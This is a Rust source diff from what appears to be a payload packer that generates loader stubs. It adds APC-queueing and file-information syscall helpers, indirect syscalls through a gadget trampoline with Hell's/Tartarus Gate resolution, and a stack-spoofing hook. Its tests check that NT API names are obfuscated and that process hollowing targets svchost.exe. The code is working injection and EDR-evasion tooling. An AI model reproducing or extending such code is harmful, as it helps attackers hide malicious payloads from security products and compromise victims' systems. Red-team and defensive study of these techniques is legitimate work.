@@ -26,7 +26,8 @@ use std::collections::BTreeSet;
 use serde::{Deserialize, Serialize};
 
 use crate::error::{PackerError, Result};
-use crate::techniques::RuntimeStep;
+use crate::plan::schema::PayloadFormat;
+use crate::techniques::{stack_spoofing, RuntimeStep};
 
 use super::obfuscation::StringsConfig;
 
@@ -1049,6 +1050,140 @@ const OPEN_PROCESS_INDIRECT: &str = r#"    /// NtOpenProcess(&Handle, DesiredAcc
     }
 "#;
 
+/// `nt_queue_apc`, mode none: `QueueUserAPC` mapped to an NTSTATUS.
+///
+/// The native call carries three APC arguments; the Win32 one carries a single
+/// pointer-sized value, so only `argument1` survives the mapping. The Win32
+/// error is mapped to an HRESULT so a failure names the real reason.
+const QUEUE_APC_NONE: &str = r#"    /// Signature of a user APC routine (one pointer-sized argument).
+    type ApcRoutineFn = unsafe extern "system" fn(usize);
+
+    /// NtQueueApcThread(ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2,
+    /// ApcArgument3). None mode: `QueueUserAPC`.
+    pub fn nt_queue_apc(
+        thread: HANDLE,
+        routine: *const core::ffi::c_void,
+        argument1: *mut core::ffi::c_void,
+        _argument2: *mut core::ffi::c_void,
+        _argument3: *mut core::ffi::c_void,
+    ) -> i32 {
+        let routine: ApcRoutineFn = unsafe { std::mem::transmute(routine) };
+        let queued = unsafe { QueueUserAPC(Some(routine), thread, argument1 as usize) };
+        if queued == 0 {
+            let error = unsafe { GetLastError() };
+            if error.0 == 0 {
+                return STATUS_UNSUCCESSFUL;
+            }
+            return windows::core::HRESULT::from_win32(error.0).0;
+        }
+        STATUS_SUCCESS
+    }
+"#;
+
+/// `nt_queue_apc`, mode indirect.
+const QUEUE_APC_INDIRECT: &str = r#"    /// NtQueueApcThread(ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2,
+    /// ApcArgument3).
+    pub fn nt_queue_apc(
+        thread: HANDLE,
+        routine: *const core::ffi::c_void,
+        argument1: *mut core::ffi::c_void,
+        argument2: *mut core::ffi::c_void,
+        argument3: *mut core::ffi::c_void,
+    ) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                thread.0 as usize,
+                routine as usize,
+                argument1 as usize,
+                argument2 as usize,
+                argument3 as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                ssns.queue_apc,
+                *gadget,
+            )
+        }
+    }
+"#;
+
+/// `nt_set_info_file`, mode none: the ntdll export resolved dynamically.
+///
+/// The Win32 equivalent (`SetFileInformationByHandle`) takes a different class
+/// enumeration, so the native call is used verbatim in both modes.
+const SET_INFO_FILE_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
+    type SetInfoFileFn = unsafe extern "system" fn(
+        HANDLE,
+        *mut core::ffi::c_void,
+        *const core::ffi::c_void,
+        u32,
+        i32,
+    ) -> i32;
+
+    /// NtSetInformationFile(FileHandle, &IoStatusBlock, FileInformation,
+    /// Length, FileInformationClass). None mode: resolve the export dynamically
+    /// (windows-rs does not declare it) and call it.
+    pub fn nt_set_info_file(
+        file: HANDLE,
+        io_status: *mut core::ffi::c_void,
+        info: *const core::ffi::c_void,
+        length: u32,
+        class: i32,
+    ) -> i32 {
+        let address = resolve_nt_export(&$SET_INFO_FILE_FUNC_DEF$);
+        if address == 0 {
+            return STATUS_UNSUCCESSFUL;
+        }
+        let set_info: SetInfoFileFn = unsafe { std::mem::transmute(address) };
+        unsafe { set_info(file, io_status, info, length, class) }
+    }
+"#;
+
+/// `nt_set_info_file`, mode indirect.
+const SET_INFO_FILE_INDIRECT: &str = r#"    /// NtSetInformationFile(FileHandle, &IoStatusBlock, FileInformation,
+    /// Length, FileInformationClass).
+    pub fn nt_set_info_file(
+        file: HANDLE,
+        io_status: *mut core::ffi::c_void,
+        info: *const core::ffi::c_void,
+        length: u32,
+        class: i32,
+    ) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                file.0 as usize,
+                io_status as usize,
+                info as usize,
+                length as usize,
+                class as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                ssns.set_info_file,
+                *gadget,
+            )
+        }
+    }
+"#;
+
 const NT_FUNCTIONS: &[NtFunction] = &[
     NtFunction {
         name: "NtAllocateVirtualMemory",
@@ -1155,6 +1290,20 @@ const NT_FUNCTIONS: &[NtFunction] = &[
         helper_none: OPEN_PROCESS_NONE,
         helper_indirect: OPEN_PROCESS_INDIRECT,
     },
+    NtFunction {
+        name: "NtQueueApcThread",
+        table_field: "queue_apc",
+        helper_name: "nt_queue_apc",
+        helper_none: QUEUE_APC_NONE,
+        helper_indirect: QUEUE_APC_INDIRECT,
+    },
+    NtFunction {
+        name: "NtSetInformationFile",
+        table_field: "set_info_file",
+        helper_name: "nt_set_info_file",
+        helper_none: SET_INFO_FILE_NONE,
+        helper_indirect: SET_INFO_FILE_INDIRECT,
+    },
 ];
 
 /// The Nt* function names the active techniques need, deduplicated and in the
@@ -1211,7 +1360,7 @@ fn api_hash(name: &[u8]) -> u64 {
     hash
 }
 
-/// Renders the `$SYSCALLS_BLOCK$` fragment for the given pipeline.
+/// Renders the `$SYSCALLS_BLOCK$` fragment for the given runtime.
 ///
 /// - No active technique needs syscalls: a no-op `init_syscalls`.
 /// - `mode: none`: the `nt_*` helpers mapped to the direct Win32 APIs.
@@ -1219,18 +1368,8 @@ fn api_hash(name: &[u8]) -> u64 {
 ///   Gate, Tartarus Gate or API hashing —, ASM trampoline, gadget scanner) plus
 ///   the helpers.
 ///
-/// Convenience wrapper around [`render_block_with`] with no extra `Nt*` needs.
-#[allow(dead_code)]
-pub fn render_block(
-    plan: &SyscallsConfig,
-    pipeline: &[RuntimeStep],
-    strings: &StringsConfig,
-) -> String {
-    render_block_with(plan, pipeline, strings, &[])
-}
-
-/// Like [`render_block`], additionally pulling in the `Nt*` helpers the selected
-/// `build.stub.api_resolution` proxies route to.
+/// `extra_nt` pulls in the `Nt*` helpers the selected `build.stub.api_resolution`
+/// proxies route to.
 pub fn render_block_with(
     plan: &SyscallsConfig,
     pipeline: &[RuntimeStep],
@@ -1264,7 +1403,7 @@ pub fn render_block_with(
                      the binary: Hell's/Tartarus Gate rebuild them at runtime from\n// obfuscated bytes, \
                      api_hash replaces them with precomputed FNV-1a hashes.\n// See docs/techniques/indirect_syscalls.md."
                 ),
-                render_indirect(plan, &required, strings),
+                render_indirect(plan, &required, strings, spoofing_block(pipeline, strings)),
             )
         }
     };
@@ -1292,14 +1431,14 @@ const EMPTY_BODY: &str = r#"    /// Initializes the syscall layer. A no-op here:
 
 /// Prelude shared by every `mode: none` block (imports + no-op init).
 const NONE_PRELUDE: &str = r#"    use windows::core::PCSTR;
-    use windows::Win32::Foundation::{CloseHandle, HANDLE};
+    use windows::Win32::Foundation::{CloseHandle, GetLastError, HANDLE};
     use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
     use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
     use windows::Win32::System::Memory::{
         VirtualAllocEx, VirtualProtectEx, PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,
     };
     use windows::Win32::System::Threading::{
-        CreateRemoteThread, ResumeThread, SuspendThread, WaitForSingleObject,
+        CreateRemoteThread, QueueUserAPC, ResumeThread, SuspendThread, WaitForSingleObject,
     };
 
     const STATUS_SUCCESS: i32 = 0;
@@ -1371,7 +1510,7 @@ const INDIRECT_PRELUDE: &str = r#"    use core::arch::global_asm;
     /// callers pass unused slots as `0`. The two trailing parameters land after
     /// every syscall argument, which is why they never reach the kernel.
     extern "system" {
-        fn nt_invoke(
+        fn $TRAMPOLINE_NAME$(
             arg1: usize,
             arg2: usize,
             arg3: usize,
@@ -1390,8 +1529,8 @@ const INDIRECT_PRELUDE: &str = r#"    use core::arch::global_asm;
 
     global_asm!(
         ".intel_syntax noprefix",
-        ".global nt_invoke",
-        "nt_invoke:",
+        ".global $TRAMPOLINE_NAME$",
+        "$TRAMPOLINE_NAME$:",
         "mov r10, rcx",         // r10 = arg1 (syscall argument convention)
         "mov eax, [rsp + 96]",  // eax = SSN (arg12)
         "mov r11, [rsp + 104]", // r11 = gadget address (syscall; ret, arg13)
@@ -1434,6 +1573,7 @@ $SSN_FIELDS$
         })?;
         let _ = SSNS.set(table);
         let _ = GADGET.set(gadget);
+$SPOOFING_INIT$
         crate::tech_dbg!("syscalls", "ssn table resolved, gadget at 0x{gadget:x}");
         Ok(())
     }
@@ -1828,6 +1968,9 @@ fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> Str
     let query_thread_def = strings
         .obfuscate("NtQueryInformationThread")
         .render_stub_expr("query_thread_name");
+    let set_info_file_def = strings
+        .obfuscate("NtSetInformationFile")
+        .render_stub_expr("set_info_file_name");
 
     let mut out = String::from(NONE_PRELUDE);
     for f in required {
@@ -1841,6 +1984,7 @@ fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> Str
         .replace("$GET_CONTEXT_FUNC_DEF$", &get_context_def)
         .replace("$SET_CONTEXT_FUNC_DEF$", &set_context_def)
         .replace("$QUERY_THREAD_FUNC_DEF$", &query_thread_def)
+        .replace("$SET_INFO_FILE_FUNC_DEF$", &set_info_file_def)
 }
 
 /// Renders the `mode: indirect` body: the prelude (with the SSN table fields,
@@ -1850,6 +1994,7 @@ fn render_indirect(
     plan: &SyscallsConfig,
     required: &[&'static NtFunction],
     strings: &StringsConfig,
+    spoofing: Option<String>,
 ) -> String {
     let ntdll_def = strings
         .obfuscate("ntdll.dll")
@@ -1889,6 +2034,18 @@ fn render_indirect(
         helpers.push('\n');
     }
 
+    // `stack_spoofing` replaces the raw trampoline with its own `nt_invoke`,
+    // so the technique's block is emitted once, below the helpers it drives (its
+    // step module is skipped by the renderer).
+    let spoofing = match spoofing {
+        Some(block) => {
+            helpers.push_str(&block);
+            helpers.push('\n');
+            true
+        }
+        None => false,
+    };
+
     let resolver_body = match plan.resolver {
         Resolver::HellsGate => HELLS_GATE_RESOLVER
             .replace("$SSN_INIT$", init.trim_end())
@@ -1920,9 +2077,39 @@ fn render_indirect(
 
     let mut out = INDIRECT_PRELUDE
         .replace("$SSN_FIELDS$", fields.trim_end())
-        .replace("$RESOLVER_BODY$", &resolver_body);
+        .replace("$RESOLVER_BODY$", &resolver_body)
+        .replace(
+            "$SPOOFING_INIT$",
+            if spoofing {
+                "        init_stack_spoofing().map_err(|e| e.to_string())?;"
+            } else {
+                ""
+            },
+        )
+        .replace(
+            "$TRAMPOLINE_NAME$",
+            if spoofing {
+                "nt_invoke_raw"
+            } else {
+                "nt_invoke"
+            },
+        );
     out.push_str(&helpers);
     out
+}
+
+/// The rendered `stack_spoofing` block, when the runtime selects that technique.
+///
+/// `None` for every other runtime, which is what leaves the raw trampoline in
+/// place under its usual `nt_invoke` name.
+fn spoofing_block(pipeline: &[RuntimeStep], strings: &StringsConfig) -> Option<String> {
+    pipeline
+        .iter()
+        .find(|step| step.name() == stack_spoofing::DEF.name)
+        .map(|step| {
+            step.technique
+                .render_fragment(strings, PayloadFormat::Pe, None)
+        })
 }
 
 /// Extracts the SSN from a Hell's Gate stub prologue.
@@ -1955,6 +2142,7 @@ mod tests {
     use super::*;
     use crate::engine::obfuscation::{StringStrategy, StringsConfig};
     use crate::techniques::process_hollowing::Params;
+    use crate::techniques::TechniqueKind;
 
     fn xor_config() -> StringsConfig {
         StringsConfig {
@@ -1964,17 +2152,18 @@ mod tests {
     }
 
     fn hollowing_pipeline() -> Vec<RuntimeStep> {
-        vec![RuntimeStep::ProcessHollowing {
+        vec![RuntimeStep::new(TechniqueKind::ProcessHollowing {
             params: Params {
+                payload: None,
                 target: r"C:\Windows\System32\svchost.exe".to_string(),
             },
-        }]
+        })]
     }
 
     fn sleep_pipeline() -> Vec<RuntimeStep> {
-        vec![RuntimeStep::SleepObfuscation {
+        vec![RuntimeStep::new(TechniqueKind::SleepObfuscation {
             params: crate::techniques::sleep_obfuscation::Params::default(),
-        }]
+        })]
     }
 
     fn indirect() -> SyscallsConfig {
@@ -2225,7 +2414,7 @@ mod tests {
 
     #[test]
     fn indirect_block_obfuscates_the_nt_names() {
-        let block = render_block(&indirect(), &hollowing_pipeline(), &xor_config());
+        let block = render_block_with(&indirect(), &hollowing_pipeline(), &xor_config(), &[]);
 
         // The names must be reconstructed at runtime, never cleartext outside
         // comments (doc comments never reach the binary; the guardrail strips
@@ -2250,7 +2439,7 @@ mod tests {
 
     #[test]
     fn indirect_block_contains_the_trampoline_and_ssn_table() {
-        let block = render_block(&indirect(), &hollowing_pipeline(), &xor_config());
+        let block = render_block_with(&indirect(), &hollowing_pipeline(), &xor_config(), &[]);
         assert!(block.contains("global_asm"), "trampoline missing");
         assert!(block.contains("jmp r11"), "gadget jump missing");
         assert!(block.contains("struct SsnTable"), "SSN table missing");
@@ -2261,7 +2450,7 @@ mod tests {
 
     #[test]
     fn tartarus_gate_block_reads_ssns_from_a_clean_file_copy() {
-        let block = render_block(&tartarus(), &hollowing_pipeline(), &xor_config());
+        let block = render_block_with(&tartarus(), &hollowing_pipeline(), &xor_config(), &[]);
 
         // The resolver walks a clean copy of ntdll read from disk, not the
         // live module's export stubs.
@@ -2284,7 +2473,7 @@ mod tests {
 
     #[test]
     fn tartarus_gate_block_obfuscates_the_ntdll_path_and_names() {
-        let block = render_block(&tartarus(), &hollowing_pipeline(), &xor_config());
+        let block = render_block_with(&tartarus(), &hollowing_pipeline(), &xor_config(), &[]);
         let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
         assert!(
             leaked.is_empty(),
@@ -2294,7 +2483,12 @@ mod tests {
 
     #[test]
     fn api_hash_block_resolves_by_hash_not_name() {
-        let block = render_block(&api_hash_config(), &hollowing_pipeline(), &xor_config());
+        let block = render_block_with(
+            &api_hash_config(),
+            &hollowing_pipeline(),
+            &xor_config(),
+            &[],
+        );
 
         // The resolver matches exports by a precomputed hash, so no NT name
         // string is emitted at all (not even obfuscated).
@@ -2329,10 +2523,11 @@ mod tests {
 
     #[test]
     fn none_block_has_no_ssn_resolution() {
-        let block = render_block(
+        let block = render_block_with(
             &SyscallsConfig::default(),
             &hollowing_pipeline(),
             &xor_config(),
+            &[],
         );
 
         assert!(
@@ -2352,10 +2547,11 @@ mod tests {
 
     #[test]
     fn none_block_obfuscates_the_dynamic_unmap_names() {
-        let block = render_block(
+        let block = render_block_with(
             &SyscallsConfig::default(),
             &hollowing_pipeline(),
             &xor_config(),
+            &[],
         );
         let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
         assert!(
@@ -2368,7 +2564,7 @@ mod tests {
 
     #[test]
     fn empty_pipeline_renders_a_no_op_block() {
-        let block = render_block(&indirect(), &sleep_pipeline(), &xor_config());
+        let block = render_block_with(&indirect(), &sleep_pipeline(), &xor_config(), &[]);
         assert!(block.contains("fn init_syscalls"), "no-op init missing");
         assert!(
             !block.contains("global_asm"),
@@ -2379,7 +2575,7 @@ mod tests {
             "no helpers without requirements"
         );
 
-        let none_block = render_block(&SyscallsConfig::default(), &[], &xor_config());
+        let none_block = render_block_with(&SyscallsConfig::default(), &[], &xor_config(), &[]);
         assert!(none_block.contains("fn init_syscalls"));
         assert!(!none_block.contains("VirtualAllocEx"));
     }
@@ -2390,7 +2586,7 @@ mod tests {
             strategy: StringStrategy::Stack,
             key: None,
         };
-        let block = render_block(&indirect(), &hollowing_pipeline(), &stack);
+        let block = render_block_with(&indirect(), &hollowing_pipeline(), &stack, &[]);
         assert!(!block.contains("dec_xor"), "stack must not use dec_xor");
         let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
         assert!(
